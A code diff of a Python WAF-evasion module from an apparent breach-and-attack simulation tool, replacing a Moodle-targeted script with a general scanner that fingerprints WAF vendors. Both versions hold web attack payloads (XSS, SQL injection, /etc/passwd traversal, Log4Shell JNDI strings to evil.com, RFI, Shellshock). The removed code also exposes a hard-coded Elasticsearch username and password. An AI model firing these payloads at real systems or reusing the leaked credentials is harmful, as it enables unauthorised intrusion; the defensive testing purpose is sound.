@@ -1,538 +1,775 @@
 ﻿import aiohttp
 import asyncio
 import urllib.parse
-import requests
-import time
-from typing import List
-from datetime import datetime, timedelta, timezone
+
+from urllib.parse import urlparse
+
 from .base import BaseAttackModule
+from bas_engine.models.simulation import Severity
 
-# ─────────────────────────────────────────────
-# CONFIGURATION
-# ─────────────────────────────────────────────
 
-TARGET_BASE      = "https://tlsoc.nile.iitb.ac.in"   # Use domain, NOT IP (WAF blocks IP access)
-MOODLE_PATH      = "/moodle/"
-ELASTIC_URL      = "https://192.168.10.62:9200/fosstlsoc-logs-modsec_audit_log-*/_search"
-ELASTIC_USER     = "Pixels@summersoc"
-ELASTIC_PASS     = "Pixels@summersoc26"
-YOUR_VPN_IP      = "10.8.0.30"                        # Your VPN IP (seen in logs as source.ip)
-DELAY_BETWEEN    = 0.5                                 # Seconds between each request
-PIPELINE_WAIT    = 8                                   # Seconds to wait for Kafka/Logstash ingestion
+# =========================================================
+# FAST MODE CONFIG
+# =========================================================
 
-# ─────────────────────────────────────────────
-# PAYLOAD LIBRARY
-# Each entry: (label, payload, expected_rule_id, category)
-# ─────────────────────────────────────────────
+FAST_MODE = True
+
+MAX_REQUESTS = 60
+
+DELAY_BETWEEN = 0.08
+
+WAF_BLOCK_CODES = [
+    403,
+    406,
+    429
+]
+
+# =========================================================
+# PARAMETERS
+# =========================================================
+
+PARAMETERS = [
+    "q",
+    "search",
+    "id",
+]
+
+# =========================================================
+# COMMON PATHS
+# =========================================================
+
+COMMON_PATHS = [
+
+    "/",
+    "/login",
+    "/search",
+    "/admin",
+]
+
+# =========================================================
+# PAYLOADS
+# =========================================================
 
 PAYLOADS = [
 
-    # ── Category 1: Plain XSS (Baseline — should always be caught) ──
     (
         "XSS_PLAIN",
-        "<script>alert('BAS_XSS')</script>",
+        "<script>alert(1)</script>",
         "941100",
-        "XSS - Plain"
+        "XSS"
     ),
 
-    # ── Category 2: URL-Encoded XSS ──
-    # WAF must decode %3C%2F before matching.
     (
-        "XSS_URL_ENCODED",
-        "%3Cscript%3Ealert%28%27BAS_ENCODED%27%29%3C%2Fscript%3E",
+        "XSS_DOUBLE",
+        "%253Cscript%253Ealert(1)%253C/script%253E",
         "941100",
-        "XSS - URL Encoded"
+        "XSS_DOUBLE"
     ),
 
-    # ── Category 3: Double URL-Encoded XSS ──
-    # Exploits WAFs that only decode once. Backend may decode twice.
-    (
-        "XSS_DOUBLE_ENCODED",
-        "%253Cscript%253Ealert%2528%2527BAS_DOUBLE%2527%2529%253C%252Fscript%253E",
-        "941100",
-        "XSS - Double URL Encoded"
-    ),
-
-    # ── Category 4: HTML Entity Encoded XSS ──
-    # Uses HTML entities; some WAFs miss these in query params.
-    (
-        "XSS_HTML_ENTITY",
-        "&#60;script&#62;alert('BAS_ENTITY')&#60;/script&#62;",
-        "941100",
-        "XSS - HTML Entity Encoded"
-    ),
-
-    # ── Category 5: Alternate Tag XSS (No <script>) ──
-    # Tests if WAF has coverage beyond just <script> tags.
-    (
-        "XSS_IMG_TAG",
-        "<img src=x onerror=alert('BAS_IMG')>",
-        "941110",
-        "XSS - IMG Tag"
-    ),
-
-    # ── Category 6: SVG-based XSS ──
-    (
-        "XSS_SVG",
-        "<svg onload=alert('BAS_SVG')>",
-        "941110",
-        "XSS - SVG Tag"
-    ),
-
-    # ── Category 7: Plain SQL Injection (Baseline) ──
-    (
-        "SQLI_PLAIN",
-        "' OR '1'='1",
-        "942100",
-        "SQLi - Plain"
-    ),
-
-    # ── Category 8: URL-Encoded SQL Injection ──
-    (
-        "SQLI_URL_ENCODED",
-        "%27%20OR%20%271%27%3D%271",
-        "942100",
-        "SQLi - URL Encoded"
-    ),
-
-    # ── Category 9: SQL Injection with Comment Obfuscation ──
-    # Uses -- and /* */ to break keyword detection.
-    (
-        "SQLI_COMMENT",
-        "' OR 1=1--",
-        "942100",
-        "SQLi - Comment Obfuscation"
-    ),
-
-    # ── Category 10: SQL UNION Attack ──
     (
         "SQLI_UNION",
-        "' UNION SELECT null,null,null--",
+        "' UNION SELECT NULL,NULL--",
         "942200",
-        "SQLi - UNION"
+        "SQLI"
     ),
 
-    # ── Category 11: Path Traversal (Basic) ──
     (
-        "PATH_TRAVERSAL_BASIC",
+        "PATH_TRAVERSAL",
         "../../../../etc/passwd",
         "930100",
-        "Path Traversal - Basic"
+        "TRAVERSAL"
     ),
 
-    # ── Category 12: Path Traversal URL-Encoded ──
-    (
-        "PATH_TRAVERSAL_ENCODED",
-        "%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd",
-        "930100",
-        "Path Traversal - URL Encoded"
-    ),
-
-    # ── Category 13: Path Traversal Double-Encoded ──
-    (
-        "PATH_TRAVERSAL_DOUBLE",
-        "%252E%252E%252F%252E%252E%252Fetc%252Fpasswd",
-        "930100",
-        "Path Traversal - Double Encoded"
-    ),
-
-    # ── Category 14: Remote File Inclusion ──
-    (
-        "RFI",
-        "http://evil.example.com/shell.txt?",
-        "931100",
-        "RFI - Remote File Inclusion"
-    ),
-
-    # ── Category 15: Log4Shell Probe (CVE-2021-44228) ──
-    # Tests if ModSecurity CRS has Log4Shell coverage (Rule 932130+).
     (
         "LOG4SHELL",
-        "${jndi:ldap://bas-test.example.com/exploit}",
+        "${jndi:ldap://evil.com/x}",
         "932130",
-        "Log4Shell - JNDI Probe"
-    ),
-
-    # ── Category 16: Shellshock Probe ──
-    # Tests User-Agent based Shellshock rule (920450).
-    (
-        "SHELLSHOCK_HEADER",
-        "() { :; }; echo BAS_SHELLSHOCK",
-        "920450",
-        "Shellshock - Header Injection"
+        "LOG4SHELL"
     ),
 ]
 
-# ─────────────────────────────────────────────
-# RESULT TRACKER
-# ─────────────────────────────────────────────
 
-results = []
-
-
-# ─────────────────────────────────────────────
-# ATTACK EXECUTION
-# ─────────────────────────────────────────────
-
-async def send_payload(session: aiohttp.ClientSession, label: str, payload: str,
-                        expected_rule: str, category: str):
-    """
-    Sends a single payload to the target and records the HTTP response.
-    ModSecurity typically returns:
-      403 Forbidden  → Payload was DETECTED and BLOCKED
-      200 OK         → Payload was NOT blocked (potential bypass or no matching rule)
-      302 Redirect   → Application redirected (common in Moodle login flows)
-    """
-    url = f"{TARGET_BASE}{MOODLE_PATH}?q={urllib.parse.quote(payload, safe='%')}"
-
-    # For Shellshock, inject into User-Agent header instead of query param
-    headers = {}
-    if label == "SHELLSHOCK_HEADER":
-        headers["User-Agent"] = payload
-        url = f"{TARGET_BASE}{MOODLE_PATH}"
-
-    try:
-        async with session.get(url, headers=headers, allow_redirects=False,
-                                ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
-            status = resp.status
-
-            # Interpret result
-            if status == 403:
-                outcome = "BLOCKED ✓"
-            elif status in (200, 302, 301):
-                outcome = "NOT BLOCKED ✗ (Potential Bypass)"
-            else:
-                outcome = f"UNEXPECTED ({status})"
-
-            result = {
-
-                # ------------------------------------------------
-                # REQUIRED BY AttackModuleResult / Pydantic
-                # ------------------------------------------------
-
-                "id":
-                    label.lower(),
-
-                "title":
-                    f"{category} Detection",
-
-                "description":
-                    (
-                        f"WAF processed payload '{label}' "
-                        f"with HTTP status {status}. "
-                        f"Expected CRS rule: {expected_rule}"
-                    ),
-
-                "severity":
-                    (
-                        "medium"
-                        if status == 403
-                        else "high"
-                    ),
-
-                "mitre_id":
-                    "T1190",
-
-                # ------------------------------------------------
-                # EXISTING DATA
-                # ------------------------------------------------
-
-                "label":
-                    label,
-
-                "category":
-                    category,
-
-                "payload":
-                    payload[:60] + (
-                        "..."
-                        if len(payload) > 60
-                        else ""
-                    ),
-
-                "url":
-                    url[:80] + (
-                        "..."
-                        if len(url) > 80
-                        else ""
-                    ),
-
-                "http_status":
-                    status,
-
-                "outcome":
-                    outcome,
-
-                "expected_rule":
-                    expected_rule,
-
-                "blocked":
-                    status == 403,
-
-                "timestamp":
-                    datetime.now(
-                        timezone.utc
-                    ).isoformat()
-            }
-            results.append(result)
-
-            icon = "✓" if status == 403 else "✗"
-            print(f"  [{icon}] {category:<40} HTTP {status} → {outcome}")
-
-    except asyncio.TimeoutError:
-        print(f"  [T] {category:<40} TIMEOUT")
-        results.append({
-
-            "id":
-                f"{label.lower()}_timeout",
-
-            "title":
-                f"{category} Timeout",
-
-            "description":
-                f"Payload '{label}' timed out during execution.",
-
-            "severity":
-                "low",
-
-            "mitre_id":
-                "T1190",
-
-            "label":
-                label,
-
-            "category":
-                category,
-
-            "payload":
-                payload[:60],
-
-            "url":
-                url[:80],
-
-            "http_status":
-                "TIMEOUT",
-
-            "outcome":
-                "TIMEOUT",
-
-            "expected_rule":
-                expected_rule,
-
-            "blocked":
-                False,
-
-            "timestamp":
-                datetime.now(
-                    timezone.utc
-                ).isoformat()
-        })
-
-    except Exception as e:
-        print(f"  [E] {category:<40} ERROR: {e}")
-        results.append({
-
-            "id":
-                f"{label.lower()}_error",
-
-            "title":
-                f"{category} Error",
-
-            "description":
-                f"Execution error occurred: {e}",
-
-            "severity":
-                "medium",
-
-            "mitre_id":
-                "T1190",
-
-            "label":
-                label,
-
-            "category":
-                category,
-
-            "payload":
-                payload[:60],
-
-            "url":
-                url[:80],
-
-            "http_status":
-                "ERROR",
-
-            "outcome":
-                f"ERROR: {e}",
-
-            "expected_rule":
-                expected_rule,
-
-            "blocked":
-                False,
-
-            "timestamp":
-                datetime.now(
-                    timezone.utc
-                ).isoformat()
-        })
-
-
-async def run_evasion_attack():
-    """Launches all payloads asynchronously against the target."""
-    print("\n" + "="*65)
-    print("  SecureForge BAS — WAF Evasion Module")
-    print(f"  Target : {TARGET_BASE}{MOODLE_PATH}")
-    print(f"  WAF    : ModSecurity v3.0.12 + OWASP CRS 4.15.0-dev")
-    print(f"  Probes : {len(PAYLOADS)} payloads across 6 attack categories")
-    print("="*65 + "\n")
-
-    connector = aiohttp.TCPConnector(ssl=False)
-    async with aiohttp.ClientSession(connector=connector) as session:
-        for label, payload, expected_rule, category in PAYLOADS:
-            await send_payload(session, label, payload, expected_rule, category)
-            await asyncio.sleep(DELAY_BETWEEN)
-
-
-# ─────────────────────────────────────────────
-# ELASTICSEARCH VALIDATION
-# ─────────────────────────────────────────────
-
-def validate_waf_detection():
-    """
-    Queries Elasticsearch to confirm ModSecurity logs were ingested
-    and how many payloads were captured by the SOC pipeline.
-    """
-    print("\n" + "="*65)
-    print("  SOC Pipeline Validation — Querying Elasticsearch")
-    print("="*65)
-
-    time_threshold = (datetime.now(timezone.utc) - timedelta(minutes=10)).isoformat()
-
-    query = {
-        "query": {
-            "bool": {
-                "must": [
-                    {"match": {"event.module": "modsec_audit_log"}},
-                    {"match": {"source.ip": YOUR_VPN_IP}}
-                ],
-                "filter": [
-                    {"range": {"@timestamp": {"gte": time_threshold}}}
-                ]
-            }
-        },
-        "aggs": {
-            "by_rule": {
-                "terms": {"field": "rule.id.keyword", "size": 20}
-            },
-            "by_action": {
-                "terms": {"field": "event.action.keyword", "size": 5}
-            }
-        }
-    }
-
-    try:
-        resp = requests.get(
-            ELASTIC_URL,
-            json=query,
-            auth=(ELASTIC_USER, ELASTIC_PASS),
-            verify=False,
-            timeout=10
-        )
-
-        if resp.status_code == 200:
-            data = resp.json()
-            total_hits = data["hits"]["total"]["value"]
-
-            print(f"\n  Total WAF events logged in Elasticsearch : {total_hits}")
-
-            # Show which rules fired
-            rule_buckets = data.get("aggregations", {}).get("by_rule", {}).get("buckets", [])
-            if rule_buckets:
-                print("\n  Rules Triggered (CRS Rule ID → Hit Count):")
-                for bucket in rule_buckets:
-                    print(f"    Rule {bucket['key']:<10} → {bucket['doc_count']} hits")
-
-            # Show block vs allow breakdown
-            action_buckets = data.get("aggregations", {}).get("by_action", {}).get("buckets", [])
-            if action_buckets:
-                print("\n  Action Breakdown:")
-                for bucket in action_buckets:
-                    print(f"    {bucket['key']:<15} → {bucket['doc_count']} events")
-
-            if total_hits > 0:
-                print(f"\n  [SUCCESS] BAS Validation Passed — SOC pipeline captured {total_hits} WAF events.")
-            else:
-                print("\n  [WARNING] No WAF events found. Check VPN IP, pipeline delay, or index name.")
-
-        else:
-            print(f"  [ERROR] Elasticsearch returned HTTP {resp.status_code}")
-
-    except Exception as e:
-        print(f"  [ERROR] Validation failed: {e}")
-
-
-# ─────────────────────────────────────────────
-# RESULTS SUMMARY
-# ─────────────────────────────────────────────
-
-def print_summary():
-    """Prints a clean table of all attack results."""
-    print("\n" + "="*65)
-    print("  ATTACK SUMMARY")
-    print("="*65)
-
-    blocked   = [r for r in results if r["http_status"] == 403]
-    bypassed  = [r for r in results if r["http_status"] in (200, 302, 301)]
-    errors    = [r for r in results if r["http_status"] not in (403, 200, 302, 301)]
-
-    print(f"\n  Total Payloads Sent  : {len(results)}")
-    print(f"  Blocked by WAF  (✓) : {len(blocked)}")
-    print(f"  Not Blocked     (✗) : {len(bypassed)}")
-    print(f"  Errors/Timeouts     : {len(errors)}")
-
-    if bypassed:
-        print("\n  ⚠  POTENTIAL BYPASSES (Payloads NOT blocked by WAF):")
-        for r in bypassed:
-            print(f"    [{r['label']}] HTTP {r['http_status']} — {r['category']}")
-            print(f"      Payload : {r['payload']}")
-            print(f"      Expected Rule: {r['expected_rule']}")
-
-    print("\n  Full Results:")
-    print(f"  {'Category':<42} {'HTTP':<8} {'Outcome'}")
-    print("  " + "-"*62)
-    for r in results:
-        print(f"  {r['category']:<42} {str(r['http_status']):<8} {r['outcome']}")
-
+# =========================================================
+# MODULE
+# =========================================================
 
 class WAFEvasionModule(BaseAttackModule):
+
     MODULE_NAME = "waf_evasion"
 
+    DESCRIPTION = (
+        "Fast adaptive WAF intelligence engine"
+    )
+
+    MITRE_TACTIC = "Initial Access"
+
+    MITRE_IDS = ["T1190"]
+
+
+    # =====================================================
+    # URL GENERATION
+    # =====================================================
+
+    def build_target_urls(self):
+
+        parsed = urlparse(self.target)
+
+        base = f"{parsed.scheme}://{parsed.netloc}"
+
+        urls = []
+
+        for path in COMMON_PATHS:
+
+            urls.append(base + path)
+
+        return urls
+
+
+    # =====================================================
+    # HEADER CLASSIFICATION
+    # =====================================================
+
+    def classify_headers(self, headers):
+
+        headers = {
+            k.lower(): v
+            for k, v in headers.items()
+        }
+
+        result = {
+
+            "proxy_detected": False,
+            "waf_detected": False,
+            "vendor": None,
+            "type": None,
+        }
+
+        # -------------------------------------------------
+        # CLOUDFLARE
+        # -------------------------------------------------
+
+        if "cf-ray" in headers:
+
+            result["proxy_detected"] = True
+            result["waf_detected"] = True
+            result["vendor"] = "Cloudflare"
+            result["type"] = "CDN/WAF"
+
+        # -------------------------------------------------
+        # AWS WAF
+        # -------------------------------------------------
+
+        elif "x-amzn-requestid" in headers:
+
+            result["waf_detected"] = True
+            result["vendor"] = "AWS WAF"
+            result["type"] = "WAF"
+
+        # -------------------------------------------------
+        # IMPERVA
+        # -------------------------------------------------
+
+        elif "x-iinfo" in headers:
+
+            result["waf_detected"] = True
+            result["vendor"] = "Imperva"
+            result["type"] = "WAF"
+
+        # -------------------------------------------------
+        # FASTLY
+        # -------------------------------------------------
+
+        elif "x-served-by" in headers:
+
+            result["proxy_detected"] = True
+            result["vendor"] = "Fastly"
+            result["type"] = "CDN"
+
+        # -------------------------------------------------
+        # SERVER DETECTION
+        # -------------------------------------------------
+
+        server = headers.get(
+            "server",
+            ""
+        ).lower()
+
+        if "nginx" in server:
+
+            result["proxy_detected"] = True
+
+            if not result["type"]:
+
+                result["type"] = "Reverse Proxy"
+
+        if "apache" in server:
+
+            result["proxy_detected"] = True
+
+            if not result["type"]:
+
+                result["type"] = "Reverse Proxy"
+
+        return result
+
+
+    # =====================================================
+    # BASELINE ANALYSIS
+    # =====================================================
+
+    async def baseline_analysis(
+        self,
+        session
+    ):
+
+        analysis = {
+
+            "reachable": False,
+            "baseline_allowed": False,
+            "baseline_status": None,
+            "headers": {},
+            "classification": {},
+        }
+
+        try:
+
+            async with session.get(
+
+                self.target,
+
+                ssl=False,
+
+                timeout=6,
+
+                allow_redirects=True
+
+            ) as response:
+
+                analysis["reachable"] = True
+
+                analysis["baseline_status"] = response.status
+
+                analysis["headers"] = dict(
+                    response.headers
+                )
+
+                if response.status < 400:
+
+                    analysis["baseline_allowed"] = True
+
+                analysis["classification"] = (
+                    self.classify_headers(
+                        response.headers
+                    )
+                )
+
+        except Exception as e:
+
+            analysis["error"] = str(e)
+
+        return analysis
+
+
+    # =====================================================
+    # SEND PAYLOAD
+    # =====================================================
+
+    async def send_payload(
+
+        self,
+
+        session,
+
+        base_url,
+
+        parameter,
+
+        label,
+
+        payload,
+
+        expected_rule,
+
+        category,
+    ):
+
+        encoded = urllib.parse.quote(
+            payload,
+            safe="%"
+        )
+
+        url = (
+            f"{base_url}"
+            f"?{parameter}={encoded}"
+        )
+
+        result = {
+
+            "label": label,
+            "payload": payload,
+            "category": category,
+            "url": url,
+            "expected_rule": expected_rule,
+        }
+
+        try:
+
+            async with session.get(
+
+                url,
+
+                ssl=False,
+
+                allow_redirects=False,
+
+                timeout=6
+
+            ) as response:
+
+                result["status"] = response.status
+
+                result["headers"] = dict(
+                    response.headers
+                )
+
+                # -----------------------------------------
+                # BLOCKED
+                # -----------------------------------------
+
+                if response.status in WAF_BLOCK_CODES:
+
+                    result["blocked"] = True
+
+                    result["outcome"] = "BLOCKED"
+
+                # -----------------------------------------
+                # ALLOWED
+                # -----------------------------------------
+
+                else:
+
+                    result["blocked"] = False
+
+                    result["outcome"] = "ALLOWED"
+
+        except asyncio.TimeoutError:
+
+            result["status"] = "TIMEOUT"
+
+            result["blocked"] = False
+
+            result["outcome"] = "TIMEOUT"
+
+        except Exception as e:
+
+            result["status"] = "ERROR"
+
+            result["blocked"] = False
+
+            result["outcome"] = str(e)
+
+        return result
+
+
+    # =====================================================
+    # MAIN EXECUTION
+    # =====================================================
+
     async def execute(self):
-        await run_evasion_attack()
-        print_summary()
-        import time
-        time.sleep(PIPELINE_WAIT)
-        validate_waf_detection()
-        return results
 
+        findings = []
 
-# ─────────────────────────────────────────────
-# MAIN
-# ─────────────────────────────────────────────
+        attack_results = []
 
-if __name__ == "__main__":
-    # Step 1: Run all payloads
-    asyncio.run(run_evasion_attack())
+        request_count = 0
 
-    # Step 2: Print local summary
-    print_summary()
+        stop_scan = False
 
-    # Step 3: Wait for Kafka/Logstash pipeline ingestion
-    print(f"\n  [!] Waiting {PIPELINE_WAIT}s for SOC pipeline ingestion (Kafka → Logstash → ES)...")
-    time.sleep(PIPELINE_WAIT)
+        path_block_counter = {}
 
-    # Step 4: Validate against Elasticsearch
-    validate_waf_detection()
+        connector = aiohttp.TCPConnector(
+            ssl=False
+        )
 
-    print("\n  [DONE] WAF Evasion module complete.\n")
+        async with aiohttp.ClientSession(
+
+            connector=connector
+
+        ) as session:
+
+            # =================================================
+            # BASELINE ANALYSIS
+            # =================================================
+
+            baseline = await self.baseline_analysis(
+                session
+            )
+
+            print(
+                "\n=== BASELINE ANALYSIS ==="
+            )
+
+            print(baseline)
+
+            # =================================================
+            # EARLY EXIT IF DEAD TARGET
+            # =================================================
+
+            if not baseline.get("reachable"):
+
+                findings.append(
+
+                    self.finding(
+
+                        title="Target Unreachable",
+
+                        description=(
+                            f"Could not reach "
+                            f"{self.target}"
+                        ),
+
+                        severity=Severity.MEDIUM,
+
+                        mitre_id="T1190",
+
+                        raw_data=baseline,
+                    )
+                )
+
+                return findings
+
+            # =================================================
+            # URLS
+            # =================================================
+
+            urls = self.build_target_urls()
+
+            # =================================================
+            # ATTACK LOOP
+            # =================================================
+
+            for base_url in urls:
+
+                if stop_scan:
+                    break
+
+                path_block_counter[
+                    base_url
+                ] = 0
+
+                # ---------------------------------------------
+                # SKIP HEAVILY PROTECTED PATHS
+                # ---------------------------------------------
+
+                if path_block_counter[
+                    base_url
+                ] >= 10:
+
+                    print(
+                        f"[!] Skipping protected path: "
+                        f"{base_url}"
+                    )
+
+                    continue
+
+                for parameter in PARAMETERS:
+
+                    if stop_scan:
+                        break
+
+                    for (
+
+                        label,
+                        payload,
+                        expected_rule,
+                        category
+
+                    ) in PAYLOADS:
+
+                        if stop_scan:
+                            break
+
+                        # -------------------------------------
+                        # MAX LIMIT
+                        # -------------------------------------
+
+                        if request_count >= MAX_REQUESTS:
+
+                            print(
+                                "\n[!] MAX REQUEST "
+                                "LIMIT REACHED"
+                            )
+
+                            stop_scan = True
+
+                            break
+
+                        result = await self.send_payload(
+
+                            session,
+
+                            base_url,
+
+                            parameter,
+
+                            label,
+
+                            payload,
+
+                            expected_rule,
+
+                            category
+                        )
+
+                        request_count += 1
+
+                        attack_results.append(
+                            result
+                        )
+
+                        # -------------------------------------
+                        # PATH BLOCK TRACKING
+                        # -------------------------------------
+
+                        if result.get("blocked"):
+
+                            path_block_counter[
+                                base_url
+                            ] += 1
+
+                        print(
+
+                            f"[{result['outcome']}] "
+
+                            f"{category} "
+
+                            f"{result['status']} "
+
+                            f"{base_url}"
+                        )
+
+                        # -------------------------------------
+                        # HIGH CONFIDENCE STOP
+                        # -------------------------------------
+
+                        blocked_now = len([
+
+                            r for r in attack_results
+                            if r.get("blocked")
+                        ])
+
+                        allowed_now = len([
+
+                            r for r in attack_results
+                            if r.get("blocked") is False
+                        ])
+
+                        if blocked_now >= 20 \
+                        and allowed_now <= 2:
+
+                            print(
+                                "\n[!] HIGH "
+                                "CONFIDENCE WAF "
+                                "DETECTED"
+                            )
+
+                            stop_scan = True
+
+                            break
+
+                        await asyncio.sleep(
+                            DELAY_BETWEEN
+                        )
+
+        # =====================================================
+        # ANALYSIS
+        # =====================================================
+
+        blocked = len([
+
+            r for r in attack_results
+            if r.get("blocked")
+        ])
+
+        bypassed = len([
+
+            r for r in attack_results
+            if r.get("blocked") is False
+        ])
+
+        total = len(attack_results)
+
+        confidence = 0
+
+        waf_detected = False
+
+        if total > 0:
+
+            ratio = blocked / total
+
+            confidence = int(
+                ratio * 100
+            )
+
+            if ratio > 0.35:
+
+                waf_detected = True
+
+        classification = baseline.get(
+            "classification",
+            {}
+        )
+
+        # =====================================================
+        # RISK SCORING
+        # =====================================================
+
+        if bypassed > blocked:
+
+            risk = "high"
+
+        elif blocked > bypassed:
+
+            risk = "low"
+
+        else:
+
+            risk = "medium"
+
+        # =====================================================
+        # NORMALIZATION DEPTH
+        # =====================================================
+
+        normalization_depth = "none"
+
+        double_encoded_blocked = any(
+
+            r["label"] == "XSS_DOUBLE"
+            and r.get("blocked")
+
+            for r in attack_results
+        )
+
+        if double_encoded_blocked:
+
+            normalization_depth = (
+                "double_url_encoded"
+            )
+
+        # =====================================================
+        # FINAL INTELLIGENCE OBJECT
+        # =====================================================
+
+        intelligence = {
+
+            "target":
+                self.target,
+
+            "reachable":
+                baseline.get(
+                    "reachable"
+                ),
+
+            "proxy_detected":
+                classification.get(
+                    "proxy_detected"
+                ),
+
+            "waf_detected":
+                waf_detected
+                or classification.get(
+                    "waf_detected"
+                ),
+
+            "waf_vendor":
+                classification.get(
+                    "vendor"
+                ),
+
+            "infrastructure_type":
+                classification.get(
+                    "type"
+                ),
+
+            "confidence":
+                confidence,
+
+            "baseline_behavior":
+                (
+                    "allowed"
+                    if baseline.get(
+                        "baseline_allowed"
+                    )
+                    else "blocked"
+                ),
+
+            "payloads_tested":
+                total,
+
+            "blocked":
+                blocked,
+
+            "bypassed":
+                bypassed,
+
+            "normalization_depth":
+                normalization_depth,
+
+            "risk_level":
+                risk,
+        }
+
+        print(
+            "\n=== ATTACK SURFACE "
+            "INTELLIGENCE ==="
+        )
+
+        print(intelligence)
+
+        # =====================================================
+        # MAIN FINDING
+        # =====================================================
+
+        findings.append(
+
+            self.finding(
+
+                title=(
+                    "Adaptive WAF "
+                    "Intelligence Analysis"
+                ),
+
+                description=(
+
+                    f"WAF="
+                    f"{intelligence['waf_detected']} "
+
+                    f"Vendor="
+                    f"{intelligence['waf_vendor']} "
+
+                    f"Blocked="
+                    f"{blocked}/{total} "
+
+                    f"Confidence="
+                    f"{confidence}% "
+
+                    f"Risk="
+                    f"{risk}"
+                ),
+
+                severity=(
+
+                    Severity.LOW
+
+                    if blocked > bypassed
+
+                    else Severity.HIGH
+                ),
+
+                mitre_id="T1190",
+
+                raw_data=intelligence,
+            )
+        )
+
+        return findings
